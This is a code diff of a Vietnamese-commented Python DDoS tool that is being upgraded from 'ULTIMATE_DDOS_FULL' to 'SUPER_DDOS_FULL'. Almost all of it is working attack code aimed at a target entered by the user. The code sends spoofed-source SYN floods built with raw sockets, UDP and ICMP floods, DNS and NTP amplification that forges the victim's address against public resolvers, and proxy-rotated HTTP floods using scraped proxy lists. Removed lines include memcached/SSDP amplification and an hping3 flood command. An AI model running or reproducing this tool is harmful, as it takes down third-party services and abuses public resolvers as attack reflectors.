@@ -1,12 +1,29 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 #
-#   ULTIMATE_DDOS_FULL.py – Nhập IP hoặc Domain, tự động phân giải
-#   Tích hợp debug, proxy, đa tiến trình, hping3, raw socket
+#   SUPER_DDOS_FULL.py – Code hoàn chỉnh, tích hợp tất cả tính năng
+#   - Tấn công đa tầng: SYN (checksum đúng), UDP, ICMP, DNS/NTP amplification (spoofed)
+#   - HTTP flood dùng aiohttp + proxy (tốc độ cao)
+#   - Tự động quét proxy từ 10+ nguồn, xoay vòng, loại bỏ proxy chết
+#   - Đa tiến trình (multiprocessing) vượt GIL, tối ưu libc
+#   - Nhập IP hoặc domain, debug thời gian thực
+#   - Chạy được trên Linux cần quyền root cho raw socket
+#
+#   Sử dụng: sudo python3 SUPER_DDOS_FULL.py
 #
 
-import os, sys, time, random, socket, struct, threading, multiprocessing
-import subprocess, requests
+import os
+import sys
+import time
+import random
+import socket
+import struct
+import threading
+import multiprocessing
+import subprocess
+import asyncio
+import aiohttp
+import requests
 from pathlib import Path
 from ctypes import CDLL, c_int, c_void_p
 from ctypes.util import find_library
@@ -17,44 +34,41 @@ CONFIG = {
     "target_host": "",
     "target_ip": "",
     "target_port": 80,
-    "threads_per_process": 200,
+    "threads_per_process": 150,
     "num_processes": 0,
     "duration": 0,
     "use_proxy": True,
     "fallback_to_own_ip": True,
-    "use_hping3": True,
     "proxy_scan_interval": 60,
-    "http_ratio": 0.5,
-    "raw_modes": ["syn","udp","icmp","dns","ntp","memcached","ssdp"],
+    "http_ratio": 0.4,
+    "raw_modes": ["syn", "udp", "icmp", "dns", "ntp"],
     "max_proxy_fails": 3,
     "proxy_timeout": 3,
     "proxy_sources": [
         "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all",
         "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all",
-        "https://www.proxy-list.download/api/v1/get?type=socks5",
-        "https://www.proxy-list.download/api/v1/get?type=http",
         "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
         "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
-        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
-        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
-        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
-        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
-        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
         "https://api.openproxylist.xyz/socks5.txt",
-        "https://api.openproxylist.xyz/http.txt",
-        "https://proxyspace.pro/proxies.txt",
-        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/socks5.txt"
+        "https://api.openproxylist.xyz/http.txt"
     ],
-    "dns_servers": ["8.8.8.8","1.1.1.1","8.8.4.4","1.0.0.1","9.9.9.9","208.67.222.222","208.67.220.220"],
-    "ntp_servers": ["0.pool.ntp.org","1.pool.ntp.org","2.pool.ntp.org","3.pool.ntp.org"],
-    "memcached_servers": [],
-    "ssdp_multicast": "239.255.255.250"
+    "dns_servers": ["8.8.8.8", "1.1.1.1", "8.8.4.4", "1.0.0.1", "9.9.9.9", "208.67.222.222"],
+    "ntp_servers": ["0.pool.ntp.org", "1.pool.ntp.org", "2.pool.ntp.org", "3.pool.ntp.org"]
 }
 
 packet_counter = multiprocessing.Value('Q', 0)
 error_counter = multiprocessing.Value('Q', 0)
 
-# ---------------------- HÀM NHẬP VÀ PHÂN GIẢI -----------------------
+# ---------------------- HÀM CHECKSUM --------------------------------
+def checksum(data):
+    if len(data) % 2 != 0:
+        data += b'\x00'
+    s = sum(struct.unpack('!%dH' % (len(data) // 2), data))
+    s = (s >> 16) + (s & 0xffff)
+    s += s >> 16
+    return ~s & 0xffff
+
+# ---------------------- NHẬP LIỆU TƯƠNG TÁC -------------------------
 def safe_input(prompt, default=None, required=False, cast_type=str):
     while True:
         try:
@@ -75,22 +89,21 @@ def safe_input(prompt, default=None, required=False, cast_type=str):
 
 def resolve_host(host):
     try:
-        ip = socket.gethostbyname(host)
-        return ip
+        return socket.gethostbyname(host)
     except:
         return host
 
 def get_user_input():
     print("\n" + "="*60)
-    print("   ULTIMATE DDOS – Hỗ trợ IP hoặc Domain")
+    print("   SUPER DDOS FULL – Hỗ trợ IP hoặc Domain")
     print("="*60)
     host = safe_input("Target (IP hoặc domain, vd: 1.2.3.4 hoặc example.com): ", required=True)
     ip = resolve_host(host)
     CONFIG["target_host"] = host
     CONFIG["target_ip"] = ip
     print(f"[*] Phân giải: {host} -> {ip}")
-    CONFIG["target_port"] = safe_input("Port (mặc dinh 80): ", default=80, cast_type=int)
-    CONFIG["threads_per_process"] = safe_input("Luồng mỗi tiến trình (mặc định 200): ", default=200, cast_type=int)
+    CONFIG["target_port"] = safe_input("Port (mặc định 80): ", default=80, cast_type=int)
+    CONFIG["threads_per_process"] = safe_input("Luồng mỗi tiến trình (mặc định 150): ", default=150, cast_type=int)
     cpu = os.cpu_count() or 4
     CONFIG["num_processes"] = safe_input(f"Số tiến trình (0 = auto = {cpu}): ", default=0, cast_type=int)
     if CONFIG["num_processes"] == 0:
@@ -98,11 +111,10 @@ def get_user_input():
     CONFIG["duration"] = safe_input("Thời gian (giây, 0 = vô hạn): ", default=0, cast_type=int)
     CONFIG["use_proxy"] = safe_input("Dùng proxy? (y/n, mặc định y): ", default='y').lower() != 'n'
     CONFIG["fallback_to_own_ip"] = safe_input("Fallback IP thật? (y/n, mặc định y): ", default='y').lower() != 'n'
-    CONFIG["use_hping3"] = safe_input("Dùng hping3 song song? (y/n, mặc định y): ", default='y').lower() != 'n'
     print("="*60)
-    print("[*] Cấu hình:")
+    print("[*] Cấu hình đã nhận:")
     for k, v in CONFIG.items():
-        if k not in ["proxy_sources","dns_servers","ntp_servers","memcached_servers"]:
+        if k not in ["proxy_sources", "dns_servers", "ntp_servers"]:
             print(f"    {k}: {v}")
     print("="*60)
     return CONFIG
@@ -151,7 +163,7 @@ def fetch_proxies_parallel():
             f.write(p + "\n")
     return good
 
-# ---------------------- CTYPES --------------------------------------
+# ---------------------- CTYPES + SEND SPOOF -------------------------
 _libc = None
 try:
     _libc = CDLL(find_library("c"))
@@ -160,7 +172,7 @@ try:
 except:
     _libc = None
 
-def send_raw_fast(sock, packet, dest_ip, dest_port):
+def send_raw(sock, packet, dest_ip, dest_port):
     try:
         if _libc:
             addr = struct.pack('=H4s', socket.AF_INET, socket.inet_aton(dest_ip))
@@ -176,37 +188,65 @@ def send_raw_fast(sock, packet, dest_ip, dest_port):
             error_counter.value += 1
         return -1
 
-# ---------------------- TẤN CÔNG RAW --------------------------------
+# ---------------------- XÂY DỰNG GÓI SYN (CÓ CHECKSUM) ------------
+def build_syn_packet(src_ip, dst_ip, sport, dport, seq):
+    ip_ver = 4
+    ip_ihl = 5
+    ip_tos = 0
+    ip_tot_len = 40
+    ip_id = random.randint(0, 65535)
+    ip_frag_off = 0
+    ip_ttl = 255
+    ip_proto = socket.IPPROTO_TCP
+    ip_src = socket.inet_aton(src_ip)
+    ip_dst = socket.inet_aton(dst_ip)
+    ip_header = struct.pack('!BBHHHBBH4s4s',
+        (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len, ip_id,
+        ip_frag_off, ip_ttl, ip_proto, 0, ip_src, ip_dst)
+    tcp_src = sport
+    tcp_dst = dport
+    tcp_seq = seq
+    tcp_ack = 0
+    tcp_doff = 5
+    tcp_flags = 0x02
+    tcp_window = 65535
+    tcp_urg = 0
+    tcp_header = struct.pack('!HHLLBBHHH',
+        tcp_src, tcp_dst, tcp_seq, tcp_ack,
+        (tcp_doff << 4), tcp_flags, tcp_window, 0, tcp_urg)
+    psh = struct.pack('!4s4sBBH', ip_src, ip_dst, 0, ip_proto, 20) + tcp_header
+    tcp_check = checksum(psh)
+    tcp_header = struct.pack('!HHLLBBHHH',
+        tcp_src, tcp_dst, tcp_seq, tcp_ack,
+        (tcp_doff << 4), tcp_flags, tcp_window, tcp_check, tcp_urg)
+    return ip_header + tcp_header
+
+# ---------------------- CÁC CHẾ ĐỘ TẤN CÔNG ------------------------
 def syn_flood(target_ip, target_port):
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-        while True:
-            src = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
-            sport = random.randint(1024,65535)
-            seq = random.randint(0,2**32-1)
-            pkt = b'\x45\x00\x00\x28' + struct.pack('!HH', random.randint(0,65535), 0)
-            pkt += struct.pack('!BBH', 255, 6, 0)
-            pkt += socket.inet_aton(src) + socket.inet_aton(target_ip)
-            pkt += struct.pack('!HHIIBBHHH', sport, target_port, seq, 0, 0x50, 0x02, 65535, 0, 0)
-            send_raw_fast(sock, pkt, target_ip, target_port)
-    except:
-        pass
+    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+    while True:
+        src = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
+        sport = random.randint(1024, 65535)
+        seq = random.randint(0, 2**32-1)
+        pkt = build_syn_packet(src, target_ip, sport, target_port, seq)
+        send_raw(sock, pkt, target_ip, target_port)
 
 def udp_flood(target_ip, target_port):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    data = random._urandom(65507)
+    data = random._urandom(1400)
     while True:
-        send_raw_fast(sock, data, target_ip, target_port)
+        send_raw(sock, data, target_ip, target_port)
 
 def icmp_flood(target_ip):
     sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
     pkt = b'\x08\x00\x00\x00\x00\x00\x00\x00' + random._urandom(56)
     while True:
-        send_raw_fast(sock, pkt, target_ip, 0)
+        send_raw(sock, pkt, target_ip, 0)
 
 def dns_amp(target_ip):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     domain = 'isc.org'
     q = struct.pack('!HHHHHH', random.randint(0,65535), 0x0100, 1, 0, 0, 0)
     for part in domain.split('.'):
@@ -214,58 +254,63 @@ def dns_amp(target_ip):
     q += b'\x00' + struct.pack('!HH', 1, 1)
     servers = CONFIG["dns_servers"]
     while True:
-        s = random.choice(servers)
-        send_raw_fast(sock, q, s, 53)
+        dns_server = random.choice(servers)
+        udp_len = 8 + len(q)
+        udp = struct.pack('!HHHH', 53, 53, udp_len, 0)
+        ip_tot_len = 20 + udp_len
+        ip_hdr = struct.pack('!BBHHHBBH4s4s',
+            (4<<4)+5, 0, ip_tot_len, random.randint(0,65535),
+            0, 255, 17, 0,
+            socket.inet_aton(target_ip), socket.inet_aton(dns_server))
+        packet = ip_hdr + udp + q
+        send_raw(sock, packet, dns_server, 53)
 
 def ntp_amp(target_ip):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     q = b'\x17\x00\x03\x2a' + b'\x00'*4 + b'\x00'*212
     servers = CONFIG["ntp_servers"]
     while True:
-        s = random.choice(servers)
-        send_raw_fast(sock, q, s, 123)
+        ntp_server = random.choice(servers)
+        udp_len = 8 + len(q)
+        udp = struct.pack('!HHHH', 123, 123, udp_len, 0)
+        ip_tot_len = 20 + udp_len
+        ip_hdr = struct.pack('!BBHHHBBH4s4s',
+            (4<<4)+5, 0, ip_tot_len, random.randint(0,65535),
+            0, 255, 17, 0,
+            socket.inet_aton(target_ip), socket.inet_aton(ntp_server))
+        packet = ip_hdr + udp + q
+        send_raw(sock, packet, ntp_server, 123)
 
-def memcached_amp(target_ip):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    q = b'\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n'
-    servers = CONFIG["memcached_servers"] or ['8.8.8.8']
-    while True:
-        s = random.choice(servers)
-        send_raw_fast(sock, q, s, 11211)
-
-def ssdp_amp(target_ip):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
-    msg = "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n"
-    while True:
-        send_raw_fast(sock, msg.encode(), CONFIG["ssdp_multicast"], 1900)
-
-def http_flood(proxy, target_ip, target_port):
-    try:
-        if '://' in proxy: proxy = proxy.split('://')[1]
-        p_ip, p_port = proxy.split(':')
-        p_port = int(p_port)
-        proxy_dict = {
-            'http': f'socks5://{p_ip}:{p_port}',
-            'https': f'socks5://{p_ip}:{p_port}'
-        }
-        if 'http' in proxy.lower():
-            proxy_dict = {'http': f'http://{p_ip}:{p_port}', 'https': f'http://{p_ip}:{p_port}'}
+# ---------------------- HTTP FLOOD (aiohttp + proxy) ---------------
+async def http_worker(proxy, target_ip, target_port):
+    if '://' in proxy:
+        proxy = proxy.split('://')[1]
+    p_ip, p_port = proxy.split(':')
+    p_port = int(p_port)
+    proxy_url = f"socks5://{p_ip}:{p_port}"
+    if 'http' in proxy.lower():
+        proxy_url = f"http://{p_ip}:{p_port}"
+    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
+    async with aiohttp.ClientSession(connector=connector) as session:
         url = f"http://{target_ip}:{target_port}/"
         headers = {'User-Agent': random.choice(['Mozilla/5.0','Chrome','Firefox']), 'Cache-Control':'no-cache'}
         while True:
             try:
-                requests.get(url, proxies=proxy_dict, headers=headers, timeout=CONFIG["proxy_timeout"])
-                requests.post(url, proxies=proxy_dict, headers=headers, data={'x':random.randint(1,9999)}, timeout=CONFIG["proxy_timeout"])
+                async with session.get(url, proxy=proxy_url, headers=headers, timeout=3) as resp:
+                    await resp.read()
+                async with session.post(url, proxy=proxy_url, headers=headers, data={'x':random.randint(1,9999)}, timeout=3) as resp:
+                    await resp.read()
                 with packet_counter.get_lock():
                     packet_counter.value += 2
             except:
                 with error_counter.get_lock():
                     error_counter.value += 1
-    except:
-        pass
 
-# ---------------------- WORKER --------------------------------------
+def run_http_loop(proxy, target_ip, target_port):
+    asyncio.run(http_worker(proxy, target_ip, target_port))
+
+# ---------------------- WORKER LUỒNG --------------------------------
 def worker_loop(process_id, thread_id, target_ip, target_port, mode, proxy_list_ref):
     fail_count = {}
     while True:
@@ -279,7 +324,10 @@ def worker_loop(process_id, thread_id, target_ip, target_port, mode, proxy_list_
                     pass
                 proxy = None
         if proxy and mode == 'http':
-            http_flood(proxy, target_ip, target_port)
+            try:
+                run_http_loop(proxy, target_ip, target_port)
+            except:
+                fail_count[proxy] = fail_count.get(proxy, 0) + 1
         else:
             if CONFIG["fallback_to_own_ip"] or not CONFIG["use_proxy"]:
                 if mode == 'http':
@@ -300,10 +348,6 @@ def worker_loop(process_id, thread_id, target_ip, target_port, mode, proxy_list_
                     dns_amp(target_ip)
                 elif mode == 'ntp':
                     ntp_amp(target_ip)
-                elif mode == 'memcached':
-                    memcached_amp(target_ip)
-                elif mode == 'ssdp':
-                    ssdp_amp(target_ip)
             else:
                 time.sleep(0.05)
 
@@ -349,17 +393,17 @@ def main():
     threads_per_proc = CONFIG["threads_per_process"]
     total_threads = num_proc * threads_per_proc
     duration = CONFIG["duration"]
-    
+
     print(f"\n[*] Khởi tạo với {num_proc} tiến trình, {total_threads} luồng.")
     print("[*] Đang quét proxy lần đầu...")
-    
+
     manager = multiprocessing.Manager()
     proxy_list = manager.list()
     initial = fetch_proxies_parallel()
     for p in initial:
         proxy_list.append(p)
     print(f"[*] Đã có {len(proxy_list)} proxy chất lượng.")
-    
+
     def proxy_updater(proxy_list):
         while True:
             time.sleep(CONFIG["proxy_scan_interval"])
@@ -370,17 +414,7 @@ def main():
             print(f"[*] Cập nhật proxy: {len(proxy_list)}")
     updater = multiprocessing.Process(target=proxy_updater, args=(proxy_list,), daemon=True)
     updater.start()
-    
-    if CONFIG["use_hping3"]:
-        def hping3_worker():
-            while True:
-                cmd = f"hping3 -S -p {target_port} --flood --rand-source {target_ip}"
-                subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                time.sleep(10)
-        hproc = multiprocessing.Process(target=hping3_worker, daemon=True)
-        hproc.start()
-        print("[*] Đã kích hoạt hping3 song song.")
-    
+
     processes = []
     for i in range(num_proc):
         p = multiprocessing.Process(target=process_worker, args=(
@@ -389,10 +423,10 @@ def main():
         p.start()
         processes.append(p)
     print(f"[*] Đã khởi động {num_proc} tiến trình.")
-    
+
     debug_thread = threading.Thread(target=debug_loop, args=(packet_counter, error_counter, proxy_list), daemon=True)
     debug_thread.start()
-    
+
     print("[*] Đang tấn công. Nhấn Ctrl+C để dừng.")
     try:
         if duration > 0:
